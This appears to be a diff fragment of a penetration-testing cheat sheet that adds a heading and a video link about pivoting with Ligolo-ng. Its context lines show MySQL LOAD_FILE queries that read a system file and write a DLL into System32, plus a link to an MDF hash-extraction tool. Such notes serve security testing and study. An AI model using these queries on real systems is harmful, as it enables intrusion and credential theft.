@@ -836,6 +836,10 @@ SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') AS Result;
 SELECT LOAD_FILE('C:\\Users\\Public\\Documents\\poc.dll') INTO DUMPFILE "C:\\Windows\\System32\\poc.dll";
 ```
 
+### :open_file_folder: Pivoting with Ligolo-ng
+
+https://www.youtube.com/watch?v=DM1B8S80EvQ
+
 ### :open_file_folder: MSSQL
 
 [Extract hash from MDF](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
